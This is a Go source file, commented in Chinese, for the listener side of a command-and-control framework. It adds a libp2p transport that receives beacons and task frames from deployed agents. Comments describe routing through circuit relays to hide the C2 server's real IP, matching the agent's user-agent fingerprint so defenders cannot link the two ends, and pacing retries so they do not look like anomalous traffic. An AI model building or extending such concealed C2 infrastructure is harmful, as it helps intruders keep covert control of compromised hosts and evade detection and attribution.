package main

// Phase5：listener 侧的 libp2p 传输。
//
// ★ 与 agent 侧 src_gopher/transport_libp2p.go **必须同构**：同一个 protocol id、同一组
//   host 选项（tcp + noise + yamux）。两端任一处漂移，症状都只是"连不上"，没有任何
//   额外信息 —— 所以这里逐项照抄 agent 侧的选择，不做"优化"。
//
// ★ 与 TCP 路径的关系是**纯增量**：TCP 的代码路径一个字节都没动，本文件所有新代码只在
//   `t.Config.Protocol == "libp2p"` 时执行（分支点见 pl_transport.go 的 7 处）。
//
// ★ 为什么需要 bufio.Reader：libp2p 的流是 gostream（net.Conn 实现），**没有
//   SyscallConn、没有 MSG_PEEK**。而 TCP 路径的探活与帧预检全靠 MSG_PEEK|MSG_DONTWAIT
//   做到"一个字节都不消费"。bufio.Reader.Peek 是这件事的**可移植等价物**：
//   缓冲里不足 n 字节时它会尝试从底层再读，失败/超时时**缓冲内容不变**。
//
// ★★ 定时炸弹（本文件存在的根本原因）：原 isClientConnected / tryDrainBeacon 对
//   `conn.(*net.TCPConn)` 断言失败分别 return false / return nil。前者让会话在**首次
//   空闲迭代**就 break（致命），后者让信标永远读不掉 ⇒ 缓冲填满 ⇒ tick 过期 ⇒ UI 离线。

import (
	"bufio"
	"context"
	"encoding/base64"
	"encoding/binary"
	"errors"
	"fmt"
	"io"
	"net"
	"strconv"
	"strings"
	"time"

	libp2p "github.com/libp2p/go-libp2p"
	libcrypto "github.com/libp2p/go-libp2p/core/crypto"
	"github.com/libp2p/go-libp2p/core/host"
	"github.com/libp2p/go-libp2p/core/peer"
	"github.com/libp2p/go-libp2p/core/protocol"
	"github.com/libp2p/go-libp2p/p2p/muxer/yamux"
	"github.com/libp2p/go-libp2p/p2p/net/gostream"
	relayclient "github.com/libp2p/go-libp2p/p2p/protocol/circuitv2/client"
	relayv2 "github.com/libp2p/go-libp2p/p2p/protocol/circuitv2/relay"
	"github.com/libp2p/go-libp2p/p2p/security/noise"
	"github.com/libp2p/go-libp2p/p2p/transport/tcp"
	ma "github.com/multiformats/go-multiaddr"
)

// axDefaultLibp2pProtocol 必须与 agent 侧 transport_libp2p.go 的
// defaultLibp2pProtocol **逐字相同** —— 这是两端唯一的路由键。
const axDefaultLibp2pProtocol = "/gopher/1.0.0"

// axLibp2pUserAgent 见 agent 侧 transport_libp2p.go 的同名常量（同一取值纪律）。
// listener 不设时的默认值实测是 "command-line-arguments@"（plugin 直接对文件列表
// 编译 ⇒ bi.Main.Path 就是它）—— 生态里绝无此值，本身就是强可疑信号。
// 与 agent 侧**必须逐字节相同**：同一 C2 两端报出不同指纹 = 自画关系图。
const axLibp2pUserAgent = "go-libp2p"

// axConnBufSize 是每条 libp2p 连接的读缓冲大小。
//
// ★ 取值理由：bufio 的 Peek(n) 要求 n <= Size，而"整帧无损预检"要 Peek(4+msgLen)
//
//	⇒ 只有 msgLen <= Size-4 的帧走预检；更大的帧放行给阻塞读（见 axPeekFrame）。
//	8KB 覆盖信标（几十~几百字节）与绝大多数任务帧。每连接常驻 8KB，100 条会话
//	800KB —— 在一台 1.9GB 内存的 teamserver 上可接受。
const axConnBufSize = 8192

// ---------------------------------------------------------------------------
// 可窥视的连接包装
// ---------------------------------------------------------------------------

// axBufferedConn 给没有 MSG_PEEK 的连接补一个可窥视的读缓冲。
//
// ★ 嵌入 net.Conn ⇒ Write / Close / SetReadDeadline / LocalAddr / RemoteAddr 全部透传，
//
//	因此 sendMsg、connection.conn.Close()、bannerError 都无需改动。
//
// ★ 只有 Read 被接管。而**所有**消费路径都经过 connRead（全文件仅 4 个调用点：
//
//	recvMsg 两处 + tryDrainBeacon 的消费段两处，且后者已收敛进 consumeFrame）——
//	所以"缓冲里的字节不会被绕过"这一点是可证的，不是假设。若将来有人新写一处
//	直接 conn.Read，就会退化成"缓冲被绕过 ⇒ 帧错位"，这是本包装唯一的失效模式。
type axBufferedConn struct {
	net.Conn
	br *bufio.Reader
}

func (c *axBufferedConn) Read(p []byte) (int, error) { return c.br.Read(p) }

// axWrapConn 把连接包成可窥视的。调用点已保证只在 Protocol == "libp2p" 时调用。
func axWrapConn(conn net.Conn) net.Conn {
	return &axBufferedConn{Conn: conn, br: bufio.NewReaderSize(conn, axConnBufSize)}
}

// axReaderOf 取出包装里的 reader；非包装连接返回 nil —— 这就是"走哪条路径"的判据。
func axReaderOf(conn net.Conn) *bufio.Reader {
	if bc, ok := conn.(*axBufferedConn); ok {
		return bc.br
	}
	return nil
}

// ---------------------------------------------------------------------------
// TCP 侧两个 MSG_PEEK 用法的可移植替代
// ---------------------------------------------------------------------------

// axProbeBuffered 是 isClientConnected 的 libp2p 分支：无损探活。
//
// ★ 判死只认"对端真的关了"（io.EOF / net.ErrClosed）。**超时算活着** —— 与 TCP 路径
//
//	把 EAGAIN 当作 alive=true 一致。原代码在这里 return false 会让会话在首次空闲
//	迭代就 break，所以本函数"宁可判活"的方向是刻意的。
func axProbeBuffered(br *bufio.Reader, conn net.Conn) bool {
	_ = conn.SetReadDeadline(time.Now().Add(100 * time.Millisecond))
	_, err := br.Peek(1)
	_ = conn.SetReadDeadline(time.Time{})
	if err != nil && (errors.Is(err, io.EOF) || errors.Is(err, net.ErrClosed)) {
		return false
	}
	return true
}

// axPeekFrame 是 tryDrainBeacon 的 libp2p 分支：确认整帧已就绪才让上层消费。
//
// 三态返回值（与 TCP 分支的 return 语义逐条对应）：
//
//	(msgLen>0, nil)  整帧就绪 ⇒ 上层走 consumeFrame
//	(0, nil)         本轮没有完整帧 ⇒ 上层 return nil（**一个字节都没动**）
//	(0, err)         对端关闭 / 长度非法 ⇒ 上层按错误处理
//
// ★ 为什么大帧不做整帧预检：Peek(n) 要求 n <= Size，超了返回 bufio.ErrBufferFull。
//
//	对 msgLen > limit 的帧直接放行给阻塞读 —— 万一中途超时，connRead 返回错误、
//	主循环 break、连接被关，**帧的残骸不会被下一轮误当成帧头**（下一轮不存在）。
//	这是"无损预检"与"能读大帧"之间的取舍点，方向取"连接宁可断，流不可错位"。
//
// ★ 与 TCP 路径的一处**有意差异**：TCP 用 drainPeekLimit=256KB，这里用 br.Size()-4
//
//	（8KB 量级）。原因是 Peek 的硬上限就是缓冲大小，不是策略选择。
func axPeekFrame(br *bufio.Reader, conn net.Conn, limit int) (uint32, error) {
	_ = conn.SetReadDeadline(time.Now().Add(200 * time.Millisecond))
	defer func() { _ = conn.SetReadDeadline(time.Time{}) }()

	hdr, err := br.Peek(4)
	if err != nil {
		if errors.Is(err, io.EOF) {
			return 0, io.EOF
		}
		return 0, nil // 超时 / 半帧：本轮跳过，不消费
	}
	msgLen := binary.BigEndian.Uint32(hdr)
	if msgLen == 0 || msgLen > 0x1900000 {
		return 0, fmt.Errorf("invalid message length %d", msgLen)
	}
	if int(msgLen) <= limit {
		if _, err := br.Peek(4 + int(msgLen)); err != nil {
			if errors.Is(err, io.EOF) {
				return 0, io.EOF
			}
			return 0, nil
		}
	}
	return msgLen, nil
}

// axReadBuffered 是 connRead 的 libp2p 分支。io.ReadFull 的"读满或报错"语义与
// 原循环逐字等价（原实现就是 readSize < size 的循环）。
func axReadBuffered(br *bufio.Reader, size int) ([]byte, error) {
	buf := make([]byte, size)
	if _, err := io.ReadFull(br, buf); err != nil {
		return nil, err
	}
	return buf, nil
}

// ---------------------------------------------------------------------------
// host / listener 构造
// ---------------------------------------------------------------------------

// axLibp2pListener 让 Stop() 里那句 t.Listener.Close() 顺带把 host 也关掉。
// ★ 不这样做就是纯泄漏：host 带后台 goroutine 与连接管理器，且一直占着端口。
type axLibp2pListener struct {
	net.Listener
	h host.Host
	// ★ 批次5：预约/续约 goroutine 的取消信号。不取消就是纯泄漏 ——
	//   它会一直拿着 host 重试，而 host 已经被 Close 了。
	cancel context.CancelFunc
}

func (l *axLibp2pListener) Close() error {
	if l.cancel != nil {
		l.cancel()
	}
	err := l.Listener.Close()
	_ = l.h.Close()
	return err
}

// axLibp2pBindPort 从第一条 callback multiaddr 里取出 TCP 端口，作为**本地**监听端口。
//
// ★ 为什么需要它（Phase5 实测出的第二个缺陷）：libp2p 的 operator 只填
// callback_addresses，而 validConfig 的 libp2p 分支在传输校验之前就 return 了
// （见 pl_transport.go），host_bind / port_bind **从不被校验**、保持零值。
// axLibp2pHost 用它们拼 ListenAddrStrings ⇒ 绑到 /ip4/0.0.0.0/tcp/0 = 内核随机端口：
// listener 报 "started"、日志打 ":0"，而 agent 按 callback_addresses 里的端口永远连不上。
//
// ★ 推不出端口时**返回错误**，不静默回落到随机端口 —— 随机端口是"成功"的假象。
func axLibp2pBindPort(cbRaw string) (int, error) {
	for _, a := range axSplitAddrs(cbRaw) {
		m, err := ma.NewMultiaddr(strings.TrimSpace(a))
		if err != nil {
			continue
		}
		v, err := m.ValueForProtocol(ma.P_TCP)
		if err != nil {
			continue
		}
		p, err := strconv.Atoi(v)
		if err != nil || p < 1 || p > 65535 {
			continue
		}
		return p, nil
	}
	return 0, errors.New("libp2p: cannot derive TCP port from callback_addresses " +
		"(multiaddr needs /tcp/<port>) -- set port_bind explicitly")
}

// axLibp2pHost 按 listener 配置建 host 并开始监听。
//
// ★ 与 agent 侧**唯一的有意差异**：agent 是拨号方（NoListenAddrs），listener 是监听方，
//
//	必须有 ListenAddrStrings。其余选项（NoTransports + tcp + noise + yamux）逐项照抄。
func axLibp2pHost(cfg TransportConfig) (host.Host, error) {
	// multiaddr 的 /ip4/ 只认真实 IPv4 字面量；主机名或 IPv6 一律回落到 0.0.0.0
	// （监听所有接口）—— 对外通告的地址由 callback_addresses 决定，与 bind 无关。
	bind := cfg.HostBind
	if net.ParseIP(bind) == nil || strings.Contains(bind, ":") {
		bind = "0.0.0.0"
	}
	// ★★ 传输层兜底（与 axPrepareLibp2p 用**同一个** axLibp2pBindPort 判据）：
	// **恢复路径**（customData != nil，见 pl_main.go 的 Create）不经过 axPrepareLibp2p
	// ⇒ 本次修复之前建的 listener，库里 port_bind 仍是 0。不在这里再推一次的话，
	// 每次重启都会静默绑回随机端口 —— 症状与"看起来启动成功、实际拨不上"完全一样。
	relayInfos, rerr := axLibp2pRelayInfos(string(cfg.Libp2pRelays))
	if rerr != nil {
		return nil, rerr
	}
	port := cfg.PortBind
	if port < 1 {
		p, err := axLibp2pBindPort(string(cfg.Callback_addresses))
		if err != nil {
			return nil, err
		}
		port = p
	}
	opts := []libp2p.Option{
		libp2p.ListenAddrStrings(fmt.Sprintf("/ip4/%s/tcp/%d", bind, port)),
		libp2p.NoTransports,
		// ★★ 必须在 NoTransports **之后**（options.go:436-438 会把 relay 一起关掉）。
		libp2p.EnableRelay(),
		libp2p.Transport(tcp.NewTCPTransport),
		libp2p.Security(noise.ID, noise.New),
		libp2p.Muxer(yamux.ID, yamux.DefaultTransport),
		// ★ 批次8：identify 报出的 agentVersion（见 axLibp2pUserAgent 定义处）。
		libp2p.UserAgent(axLibp2pUserAgent),
	}
	if cfg.Libp2pPrivKey != "" {
		raw, err := base64.StdEncoding.DecodeString(cfg.Libp2pPrivKey)
		if err != nil {
			return nil, fmt.Errorf("libp2p: bad l2p_privkey base64: %w", err)
		}
		sk, err := libcrypto.UnmarshalPrivateKey(raw)
		if err != nil {
			return nil, fmt.Errorf("libp2p: unmarshal privkey: %w", err)
		}
		opts = append(opts, libp2p.Identity(sk))
	}
	// ★ 私钥为空时 libp2p 会自生成**临时**身份 ⇒ peer id 每次启动都变 ⇒ agent 手里那份
	//   带 /p2p/<id> 的 multiaddr 立刻失效。这里不阻止（方便先跑通链路），
	//   由 Create() 负责在新建 listener 时就把固定私钥生成好并持久化。
	// ★ 批次5 隐藏面：identify 会把 h.Addrs()（= 真实网卡监听地址）送给**任何**
	//   连上来的对端 —— 实测 agent 的 peerstore 里出现了 /ip4/10.7.34.40/tcp/44973。
	//   配了 relay 时只对外通告 circuit 地址：既藏住了 C2 的 IP，也把"该拨哪儿"
	//   这件事说全了。
	if len(relayInfos) > 0 {
		var maddrs []ma.Multiaddr
		for _, c := range axLibp2pCircuitAddrs(string(cfg.Libp2pRelays), axLibp2pPeerID(cfg.Libp2pPrivKey)) {
			if m, merr := ma.NewMultiaddr(c); merr == nil {
				maddrs = append(maddrs, m)
			}
		}
		// ★ 只有真的算出了 circuit 地址才装这个工厂：算出空列表时装上去会**通告零地址**，
		//   那比不装更糟 —— 对端连直连兜底都学不到了。
		if len(maddrs) > 0 {
			opts = append(opts, libp2p.AddrsFactory(
				func([]ma.Multiaddr) []ma.Multiaddr { return maddrs }))
		}
	}
	return libp2p.New(opts...)
}

// axListenLibp2p 是 Start() 的 libp2p 分支：建 host + gostream.Listen。
//
// ★ gostream.Listen 返回的正是 net.Listener，所以 Start() 里那个 `for { Accept() }`
//
//	循环**一个字都不用改** —— 这是选 gostream 而不是裸 network.Stream 的直接收益。
func axListenLibp2p(cfg TransportConfig) (net.Listener, error) {
	// ★ relayInfos 必须在这个函数里**自己**解析一份：axLibp2pHost 里那份是它自己的
	//   局部变量，跨不过函数边界（这是实测的编译错误 `undefined: relayInfos`）。
	relayInfos, err := axLibp2pRelayInfos(string(cfg.Libp2pRelays))
	if err != nil {
		return nil, err
	}
	h, err := axLibp2pHost(cfg)
	if err != nil {
		return nil, err
	}
	proto := protocol.ID(cfg.Libp2pProtocol)
	if cfg.Libp2pProtocol == "" {
		proto = axDefaultLibp2pProtocol
	}
	ln, err := gostream.Listen(h, proto)
	if err != nil {
		_ = h.Close()
		return nil, err
	}
	// ★ 预约必须在 gostream.Listen **之后**才启动：预约成功后 relay 立刻就可能
	//   转发入站连接，此时流处理器还没注册的话，第一个 agent 会看到 stream reset，
	//   而日志里只有一行"预约成功"。
	ctx, cancel := context.WithCancel(context.Background())
	if len(relayInfos) > 0 {
		axLibp2pRelayKeep(ctx, h, relayInfos)
	}
	return &axLibp2pListener{Listener: ln, h: h, cancel: cancel}, nil
}

// ---------------------------------------------------------------------------
// 配置：校验 / 私钥 / AgentAddr 补全
// ---------------------------------------------------------------------------

// axSplitAddrs 把 callback_addresses 的多种分隔形式拆成 token 列表。
// 与 validConfig 里 TCP 分支用的分隔符集合保持一致（换行 / 回车 / 逗号），
// 额外接受空格 —— multiaddr 本身不含空格，所以这是安全的放宽。
func axSplitAddrs(raw string) []string {
	return strings.FieldsFunc(raw, func(r rune) bool {
		return r == '\n' || r == '\r' || r == ',' || r == ' ' || r == '\t'
	})
}

// axValidateLibp2pAddrs 校验 libp2p 模式的 callback_addresses。
//
// ★ 必须独立于 TCP 的校验：TCP 分支用 net.SplitHostPort，而 multiaddr
//
//	（/ip4/1.2.3.4/tcp/4444/p2p/12D3Koo...）在那一步必然报
//	"cannot split host:port" —— 直接用原校验会让 libp2p listener 根本建不起来。
func axValidateLibp2pAddrs(cbRaw string) error {
	n := 0
	for _, a := range axSplitAddrs(cbRaw) {
		a = strings.TrimSpace(a)
		if a == "" {
			continue
		}
		m, err := ma.NewMultiaddr(a)
		if err != nil {
			return fmt.Errorf("Invalid multiaddr: %s (%v)\n", a, err)
		}
		// ★ 必须能解析出 peer id：agent 侧走 peer.AddrInfoFromP2pAddr，
		//   没有 /p2p/<id> 就没有拨号目标。
		if _, err := peer.AddrInfoFromP2pAddr(m); err != nil {
			return fmt.Errorf("Invalid multiaddr (need /p2p/<peerID>): %s\n", a)
		}
		n++
	}
	if n == 0 {
		return errors.New("callback_servers is required")
	}
	return nil
}

// axGenerateLibp2pKey 生成一把 Ed25519 私钥并 base64 编码（libp2p 的私钥序列化格式）。
// ★ 只在**新建** listener 且未提供私钥时调用一次，结果随 config 一起持久化进 customData。
func axGenerateLibp2pKey() (string, error) {
	sk, _, err := libcrypto.GenerateKeyPair(libcrypto.Ed25519, 0)
	if err != nil {
		return "", err
	}
	raw, err := libcrypto.MarshalPrivateKey(sk)
	if err != nil {
		return "", err
	}
	return base64.StdEncoding.EncodeToString(raw), nil
}

// axLibp2pPeerID 从 base64 私钥算出 peer id 字符串；不可用时返回 ""。
func axLibp2pPeerID(privKeyB64 string) string {
	if privKeyB64 == "" {
		return ""
	}
	raw, err := base64.StdEncoding.DecodeString(privKeyB64)
	if err != nil {
		return ""
	}
	sk, err := libcrypto.UnmarshalPrivateKey(raw)
	if err != nil {
		return ""
	}
	id, err := peer.IDFromPrivateKey(sk)
	if err != nil {
		return ""
	}
	return id.String()
}

// axFillLibp2pAgentAddr 给每个 multiaddr 补上 /p2p/<peerID>（若尚未带）。
//
// ★ 为什么必须补：peer id 由私钥决定，而 operator 在 UI 上只填 /ip4/<ip>/tcp/<port>——
//
//	要求他手抄 52 字符的 peer id 既易错又没必要。补全后写进 ListenerData.AgentAddr，
//	agent 生成时拿到的就是可直接拨的完整地址。
//
// ★ 私钥不可用（peer id 算不出）时**原样返回**，让校验分支去报错 —— 不在这里造一个假 id。
func axFillLibp2pAgentAddr(cbRaw, privKeyB64 string) string {
	id := axLibp2pPeerID(privKeyB64)
	out := make([]string, 0, 4)
	for _, a := range axSplitAddrs(cbRaw) {
		a = strings.TrimSpace(a)
		if a == "" {
			continue
		}
		if id != "" && !strings.Contains(a, "/p2p/") {
			a = strings.TrimSuffix(a, "/") + "/p2p/" + id
		}
		out = append(out, a)
	}
	return strings.Join(out, ", ")
}

// ---------------------------------------------------------------------------
// Phase5 批次5：circuit relay v2 预约（隐藏 C2 真实 IP）
// ---------------------------------------------------------------------------

// axRelayRenewFloor 是续约/重试的**下限**间隔。
// ★ 取值理由：relayv2 的 ReservationTTL 默认 1h，半程续约 = 30min；失败重试若没有
//
//	下限，一次瞬时 DNS/网络抖动会变成忙等（每 30s 一次的握手风暴，反而更像异常流量）。
const axRelayRenewFloor = 3 * time.Minute

// axRelayHandshakeTimeout 是单次预约的预算。与 relay 建流要走 Noise + yamux。
const axRelayHandshakeTimeout = 30 * time.Second

// axLibp2pRelayInfos 解析 l2p_relays。
//
// ★ 每条都必须带 /p2p/<relayPeerID>：relay 的 peer id 就是预约的路由键，
//
//	没有它 libp2p 连"找谁预约"都不知道。这里**拒绝落盘**而不是跳过该条 ——
//	跳过一条的后果是"以为配了两个 relay，实际只预约上一个"。
//
// ★ 反过来，地址里**不该**出现 /p2p-circuit：那一段由 axLibp2pCircuitAddrs 补。
//
//	把完整的 circuit 地址填进来是个很自然的误用，而它的症状是"预约失败"，
//	看不出是填错了 —— 所以直接拒掉并说清楚该填什么。
func axLibp2pRelayInfos(raw string) ([]peer.AddrInfo, error) {
	out := make([]peer.AddrInfo, 0, 2)
	for _, a := range axSplitAddrs(raw) {
		a = strings.TrimSpace(a)
		if a == "" {
			continue
		}
		m, err := ma.NewMultiaddr(a)
		if err != nil {
			return nil, fmt.Errorf("l2p_relays: 不是合法 multiaddr: %s (%v)", a, err)
		}
		if _, err := m.ValueForProtocol(ma.P_CIRCUIT); err == nil {
			return nil, errors.New("l2p_relays: " + a + " 里不应含 /p2p-circuit —— " +
				"这里填 relay **自身**的地址 /ip4/.../tcp/.../p2p/<relayPeerID>，" +
				"/p2p-circuit 那段由 listener 自己补")
		}
		ai, err := peer.AddrInfoFromP2pAddr(m)
		if err != nil {
			return nil, fmt.Errorf("l2p_relays: %s 缺 /p2p/<relayPeerID>（relay 的 peer id "+
				"就是预约的路由键，没有它预约不上）: %v", a, err)
		}
		out = append(out, *ai)
	}
	return out, nil
}

// axLibp2pCircuitAddrs 把 relay 地址组合成 **agent 该拨的** circuit 地址。
//
// 形式：<relayAddr>/p2p-circuit/p2p/<selfPeerID>
// ★ 末尾的 selfPeerID 是必须的：relay 靠它知道转发给谁；agent 也靠它做 Noise 握手
//
//	的身份校验。少了它 peer.AddrInfoFromP2pAddr 会把 relay 的 id 当成目标。
func axLibp2pCircuitAddrs(relayRaw, selfID string) []string {
	if selfID == "" {
		return nil
	}
	out := make([]string, 0, 2)
	for _, a := range axSplitAddrs(relayRaw) {
		a = strings.TrimSuffix(strings.TrimSpace(a), "/")
		if a == "" {
			continue
		}
		out = append(out, a+"/p2p-circuit/p2p/"+selfID)
	}
	return out
}

// axFillLibp2pRelayAddrs 在"配了 relay 且**没有**显式给 l2p_addrs"时，
// 把 agent 该拨的 circuit 地址组合进 Libp2pAddrs。
//
// ★ 显式给了 l2p_addrs 就以它为准（operator 可能想同时留一条直连做兜底）；
//
//	没给才自动组合 ⇒ "隐藏 C2 IP"是默认行为，不依赖人记得去填。
//
// ★ 算不出地址时**返回错误**，不静默跳过：跳过等于 agent 拿不到任何地址，
//
//	而 UI 上 listener 一切正常 —— 这正是本项目反复归档的那类"静默走错"。
func axFillLibp2pRelayAddrs(c *TransportConfig) error {
	relays, err := axLibp2pRelayInfos(string(c.Libp2pRelays))
	if err != nil {
		return err
	}
	if len(relays) == 0 {
		return nil
	}
	if len(axSplitAddrs(string(c.Libp2pAddrs))) > 0 {
		return nil
	}
	circ := axLibp2pCircuitAddrs(string(c.Libp2pRelays), axLibp2pPeerID(c.Libp2pPrivKey))
	if len(circ) == 0 {
		return errors.New("l2p_relays 已配但算不出 circuit 地址（l2p_privkey 不可用？）")
	}
	c.Libp2pAddrs = StringOrArray(strings.Join(circ, ", "))
	return nil
}

// axLibp2pRelayKeep 对每条 relay 维持一个 circuit v2 **预约**，直到 ctx 结束。
//
// ★ 为什么是显式预约而不是 libp2p 的 autorelay（实测否掉）：
//
//	autorelay.go:114 `if r.status != network.ReachabilityPrivate { return addrs }`
//	—— 它只在判定自己"不可达"时才通告 relay 地址。C2 listener 是公网可达的
//	⇒ 它会预约成功却**不通告**，外部行为与"没配 relay"逐字相同。
//	显式预约与可达性判定无关。
func axLibp2pRelayKeep(ctx context.Context, h host.Host, relays []peer.AddrInfo) {
	for _, ri := range relays {
		go axLibp2pReserveLoop(ctx, h, ri)
	}
}

func axLibp2pReserveLoop(ctx context.Context, h host.Host, ri peer.AddrInfo) {
	// ★ 用**上游的默认限额**当"已知会掐断"的标尺，不写死数字：
	//   实测默认档（2m / 128KiB）下 200000 B 的流会被 relay `stream reset`，
	//   放宽到 1h/1GiB 后同一份代码同一份载荷通过 ⇒ 归因干净。
	//   引用 DefaultLimit() 而不是抄一份常量，上游改了我们跟着改。
	bad := relayv2.DefaultLimit()
	for {
		rctx, cancel := context.WithTimeout(ctx, axRelayHandshakeTimeout)
		rsv, err := relayclient.Reserve(rctx, h, ri)
		cancel()
		if err != nil {
			if ctx.Err() != nil {
				return
			}
			fmt.Printf("  [relay] 预约失败 relay=%s: %v（%s 后重试）\n",
				ri.ID, err, axRelayRenewFloor)
			if !axSleepCtx(ctx, axRelayRenewFloor) {
				return
			}
			continue
		}
		fmt.Printf("  [relay] 预约成功 relay=%s 到期=%s 限额=%s/%d 字节\n",
			ri.ID, rsv.Expiration.Format(time.RFC3339), rsv.LimitDuration, rsv.LimitData)
		if bad.Data > 0 && rsv.LimitData <= uint64(bad.Data) { // ★ LimitData 是 uint64、RelayLimit.Data 是 int64（实测编译错误）
			fmt.Printf("  [relay] ★警告 relay=%s 单条电路上限只有 %d 字节（上游默认 %d）—— "+
				"实测这个量级会把 C2 会话**掐断**（stream reset）。请在 relay 侧用 "+
				"relayv2.WithResources 放宽 Limit.Data\n", ri.ID, rsv.LimitData, bad.Data)
		}
		if rsv.LimitDuration > 0 && rsv.LimitDuration <= bad.Duration {
			fmt.Printf("  [relay] ★警告 relay=%s 单条电路时限只有 %s（上游默认 %s）—— "+
				"超过它的会话会被 relay 重置。请在 relay 侧放宽 Limit.Duration\n",
				ri.ID, rsv.LimitDuration, bad.Duration)
		}
		// 半程续约：留一半余量，避免"刚好在过期那一刻续约"。
		wait := time.Until(rsv.Expiration) / 2
		if wait < axRelayRenewFloor {
			wait = axRelayRenewFloor
		}
		if !axSleepCtx(ctx, wait) {
			return
		}
	}
}

// axSleepCtx 睡 d；ctx 结束则返回 false（调用方据此退出）。
func axSleepCtx(ctx context.Context, d time.Duration) bool {
	t := time.NewTimer(d)
	defer t.Stop()
	select {
	case <-ctx.Done():
		return false
	case <-t.C:
		return true
	}
}
